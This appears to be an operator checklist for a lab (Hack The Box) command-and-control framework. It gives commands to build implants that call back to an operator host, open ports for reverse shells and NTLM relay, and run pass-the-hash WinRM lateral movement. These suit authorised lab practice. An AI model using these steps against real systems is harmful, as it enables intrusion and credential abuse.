# Operator inbound checklist (lab / HTB)

**Audience:** before dropping any implant or starting a listener that faces `tun0`.  
**Related:** `docs/OPERATOR_PRE_IMPLANT.md`, `docs/C_IMPLANT_LAB_CHECKLIST.md`, `scripts/htb_reverse_tunnel.sh`.

Wire protocol still returns **HTTP 404** on auth failure (anti-fingerprint). Teamserver logs must show the reason class.

## Auth drop reasons (server log)

| Reason | Meaning | Typical fix |
| --- | --- | --- |
| `unknown_implant` | Secret lookup failed / not registered | Rebuild implant with fleet secret; check `implant_secret` / ldflags |
| `hmac` | HMAC signature mismatch | Wrong secret, wrong implant ID, or corrupted payload |
| `skew` | Timestamp outside replay window | Host/DC clock skew; sync time or widen window (default 8h) |
| `replay` | Same (id, timestamp) already seen | Sleep too low with second-resolution timestamps (fixed: use ms); or dual teamservers sharing ID |
| `parse` | Protobuf unmarshal failed | Wrong path/body, non-implant client, truncated POST |
| `io` | Body read failed | Client disconnect mid-request |
| `internal` | Session key / DB / other server error | Check full log line |

Example lines:

```text
[register] unknown_implant id=abc: no secret
[beacon] skew reject implant=abc: timestamp outside replay window
[https] beacon drop reason=parse len=12: proto: …
[https] beacon drop implant=abc: beacon auth failed: hmac: …
```

## Pre-flight (every eng)

```text
[ ] HTB VPN up; note tun0 IP (ip -br a show tun0)
[ ] Target reachable (nmap or ping as appropriate)
[ ] Secrets only in files (mode 600) — never bash $$ in double quotes
[ ] Clock: compare operator UTC vs DC LDAP currentTime if Kerberos later
```

## Teamserver vs listener

| Command | What it starts |
| --- | --- |
| `erebus serve` | Unified teamserver + default HTTPS implant listener + gRPC operator API |
| `erebus teamserver` / `./build/teamserver` | Same control plane (legacy binary name) |
| HTTPS listener port | Prefer **≥1024** (e.g. `:8443`) for rootless ops |

```bash
make erebus
./build/erebus serve
# gRPC often 127.0.0.1:50051; HTTPS implant port from config / flags (lab: 8443)
./build/erebus certs seats   # operator + approver for dual-control oneshots
```

## Firewall (operator host)

Inbound from the box to your `tun0` is often blocked by **firewalld** / ufw:

```bash
# Fedora firewalld — open C2 + common lab ports
sudo firewall-cmd --add-port=8443/tcp
sudo firewall-cmd --add-port=8888/tcp   # NTLM relay (pre-implant)
sudo firewall-cmd --add-port=4444/tcp   # reverse shells
# optional (broader):
# sudo firewall-cmd --zone=trusted --add-interface=tun0
```

**Sanity check from target** (after foothold): `curl -vk https://YOUR_TUN0:8443/` should get a TLS handshake (404 body is fine).

## When target cannot reach tun0

Many HTB boxes (FireFlow, DarkZeroReturns, etc.) **block outbound to VPN**. Use reverse tunnel:

```bash
# Operator: teamserver already listening on 127.0.0.1:8443
./scripts/htb_reverse_tunnel.sh user@TARGET_IP

# Build implant to loopback (tunnel carries traffic)
make implant-c-linux \
  CALLBACK_URL=https://127.0.0.1:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
  SLEEP_MS=500
```

## Implant build hygiene

```bash
# Windows primary (C)
make implant-c CALLBACK_URL=https://YOUR_C2:8443 \
  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10

# Or generate (default language c for Windows)
# generate --os windows --arch amd64 --callback https://… --language c
```

- Empty implant ID/secret → **fail closed** at build/load  
- HTTPS without CA pin → fail closed for C implant  
- Lab sleep: **≥500 ms** (ms timestamps; sub-second OK)

## WinRM PTH (A.1 notes)

```text
lateral winrm <host> "whoami" --user U --domain DOM --hash <32-hex-NT>
# or: --pass / --pass-file
```

| Path | Message encryption | Notes |
| --- | --- | --- |
| Password | **Yes** (NTLM seal via masterzen Encryption) | Prefer when password is available |
| Hash (PTH) | **Yes** (NTLM Sign/Seal + SPNEGO multipart) | Domain-aware TYPE3; seals when host negotiates Sign/Seal (`AllowUnencrypted=false`) |

On 401, errors hint domain format (NETBIOS + 32-hex NT). Live GOAD/pypsrp parity remains eng-verify (`docs/C_IMPLANT_LAB_CHECKLIST.md` §5).

## Dual-seat oneshots

```bash
./build/erebus op sessions
./build/erebus op shell -- whoami
./build/erebus op lateral winrm <IP> "whoami" --user u --domain D --hash <NT>
./build/erebus op pending
./build/erebus op approve-all
```

## End of session

```text
[ ] Stop SOCKS / listeners not needed
[ ] Kill implants on target
[ ] Close reverse tunnel SSH
[ ] firewall-cmd --remove-port=… if temporary
[ ] No secrets left in git status
```
